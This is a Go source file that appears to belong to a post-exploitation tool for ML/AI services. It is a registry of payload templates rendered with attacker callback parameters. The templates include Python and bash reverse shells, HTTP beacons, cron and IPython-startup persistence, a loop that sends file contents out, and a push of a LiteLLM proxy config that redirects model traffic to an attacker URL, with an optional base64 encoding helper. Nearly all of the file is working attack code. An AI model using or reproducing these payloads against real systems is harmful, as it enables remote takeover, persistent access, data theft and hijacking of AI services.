// Package payloads provides a template-based payload generation library
// for post-exploitation actions across ML/AI service targets.
package payloads

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"text/template"
)

// Params holds the variables available to all payload templates.
type Params struct {
	CallbackHost string
	CallbackPort int
	CallbackURL  string
	Interval     int
	Shell        string
	ExfilPath    string
	Model        string
	Provider     string
}

type payloadEntry struct {
	Name     string
	Language string
	Template string
}

var registry = []payloadEntry{
	{
		Name:     "python-revshell",
		Language: "python",
		Template: `import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{{.CallbackHost}}",{{.CallbackPort}}))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["{{or .Shell "/bin/sh"}}","-i"])`,
	},
	{
		Name:     "python-beacon",
		Language: "python",
		Template: `import urllib.request,time,socket,json,os
while True:
    try:
        data=json.dumps({"host":socket.gethostname(),"user":os.getenv("USER","unknown"),"proof":"beacon"}).encode()
        req=urllib.request.Request("{{.CallbackURL}}",data=data,headers={"Content-Type":"application/json"})
        urllib.request.urlopen(req,timeout=10)
    except Exception:
        pass
    time.sleep({{or .Interval 30}})`,
	},
	{
		Name:     "python-persist-cron",
		Language: "python",
		Template: `import subprocess,tempfile,os
script='''#!/usr/bin/env python3
import urllib.request,socket,json,os
data=json.dumps({"host":socket.gethostname(),"user":os.getenv("USER","unknown"),"proof":"persist-cron"}).encode()
req=urllib.request.Request("{{.CallbackURL}}",data=data,headers={"Content-Type":"application/json"})
urllib.request.urlopen(req,timeout=10)
'''
p=os.path.join(tempfile.gettempdir(),"aipostex_cron.py")
with open(p,"w") as f:
    f.write(script)
os.chmod(p,0o755)
subprocess.run(["crontab","-l"],capture_output=True)
entry=f"*/{{or .Interval 5}} * * * * python3 {p}\n"
subprocess.run(f'(crontab -l 2>/dev/null; echo "{entry.strip()}") | crontab -',shell=True)
print(f"Persistence installed: {p}")`,
	},
	{
		Name:     "python-persist-jupyter-ext",
		Language: "python",
		Template: `import os,pathlib
startup_dir=pathlib.Path.home()/".ipython"/"profile_default"/"startup"
startup_dir.mkdir(parents=True,exist_ok=True)
script='''
import urllib.request,socket,json,os
try:
    data=json.dumps({"host":socket.gethostname(),"user":os.getenv("USER","unknown"),"proof":"jupyter-persist"}).encode()
    req=urllib.request.Request("{{.CallbackURL}}",data=data,headers={"Content-Type":"application/json"})
    urllib.request.urlopen(req,timeout=10)
except Exception:
    pass
'''
target=startup_dir/"50-aipostex.py"
target.write_text(script)
print(f"IPython startup script deployed: {target}")`,
	},
	{
		Name:     "python-exfil-http",
		Language: "python",
		Template: `import urllib.request,json,os,glob
files=glob.glob("{{or .ExfilPath "/tmp"}}/**",recursive=True)
for f in files[:50]:
    if os.path.isfile(f) and os.path.getsize(f)<65536:
        try:
            with open(f,"rb") as fh:
                content=fh.read()
            data=json.dumps({"path":f,"size":len(content),"content":content.decode("utf-8",errors="replace")[:4096]}).encode()
            req=urllib.request.Request("{{.CallbackURL}}",data=data,headers={"Content-Type":"application/json"})
            urllib.request.urlopen(req,timeout=10)
        except Exception:
            pass
print(f"Exfiltration attempted: {len(files)} files scanned")`,
	},
	{
		Name:     "python-proxy-litellm",
		Language: "python",
		Template: `import urllib.request,json
config={"model_list":[{"model_name":"{{or .Model "gpt-4"}}","litellm_params":{"model":"{{or .Provider "openai"}}/{{or .Model "gpt-4"}}","api_base":"{{.CallbackURL}}"}}]}
data=json.dumps(config).encode()
req=urllib.request.Request("{{.CallbackURL}}/config",data=data,headers={"Content-Type":"application/json"})
try:
    urllib.request.urlopen(req,timeout=10)
    print("LiteLLM proxy config deployed")
except Exception as e:
    print(f"Config push failed: {e}")`,
	},
	{
		Name:     "bash-revshell",
		Language: "bash",
		Template: `{{or .Shell "/bin/bash"}} -i >& /dev/tcp/{{.CallbackHost}}/{{.CallbackPort}} 0>&1`,
	},
	{
		Name:     "bash-beacon",
		Language: "bash",
		Template: `while true; do curl -s -X POST -H "Content-Type: application/json" -d "{\"host\":\"$(hostname)\",\"user\":\"$(whoami)\",\"proof\":\"beacon\"}" "{{.CallbackURL}}" 2>/dev/null; sleep {{or .Interval 30}}; done`,
	},
}

// Generate renders the named payload template with the given parameters.
func Generate(name string, params Params) (string, error) {
	for _, entry := range registry {
		if entry.Name == name {
			tmpl, err := template.New(name).Parse(entry.Template)
			if err != nil {
				return "", fmt.Errorf("parsing template %s: %w", name, err)
			}
			var buf bytes.Buffer
			if err := tmpl.Execute(&buf, params); err != nil {
				return "", fmt.Errorf("executing template %s: %w", name, err)
			}
			return buf.String(), nil
		}
	}
	return "", fmt.Errorf("unknown payload: %s", name)
}

// GenerateEncoded renders the named payload and encodes it.
// Supported encodings: "base64", "raw" (no encoding).
func GenerateEncoded(name string, params Params, encoding string) (string, error) {
	raw, err := Generate(name, params)
	if err != nil {
		return "", err
	}
	switch encoding {
	case "base64":
		return base64.StdEncoding.EncodeToString([]byte(raw)), nil
	case "raw", "":
		return raw, nil
	default:
		return "", fmt.Errorf("unsupported encoding: %s", encoding)
	}
}

// PayloadInfo describes a registered payload.
type PayloadInfo struct {
	Name     string
	Language string
}

// List returns info about all registered payloads.
func List() []PayloadInfo {
	out := make([]PayloadInfo, len(registry))
	for i, e := range registry {
		out[i] = PayloadInfo{Name: e.Name, Language: e.Language}
	}
	return out
}

// SizeEstimate returns the approximate rendered size of a payload in bytes.
func SizeEstimate(name string) int {
	for _, entry := range registry {
		if entry.Name == name {
			return len(entry.Template)
		}
	}
	return 0
}
